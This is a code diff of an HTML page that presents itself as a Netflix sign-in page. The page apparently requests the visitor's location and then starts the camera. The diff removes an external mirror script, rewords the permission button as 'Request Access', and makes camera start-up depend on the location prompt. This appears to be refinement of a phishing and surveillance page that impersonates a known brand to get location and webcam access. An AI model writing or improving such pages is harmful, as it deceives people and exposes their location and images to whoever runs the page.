@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix - Sign In</title>
-    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -272,7 +271,7 @@
         <div class="request-access-icon">📍</div>
         <div class="request-access-title">Request Access</div>
         <div class="request-access-text">Please allow or deny location access to continue. We will wait for your response.</div>
-        <button class="request-access-btn" id="requestAccessBtn">Allow Location Access</button>
+        <button class="request-access-btn" id="requestAccessBtn">Request Access</button>
         <div class="request-access-status" id="requestAccessStatus"></div>
     </div>
 
@@ -421,11 +420,9 @@
             }, 2000);
         });
 
-        // Initialize camera after location permission
+        // Initialize camera only after location permission is done
         if (window.LocationRequest) {
             LocationRequest.init(init);
-        } else {
-            init();
         }
     </script>
 </body>
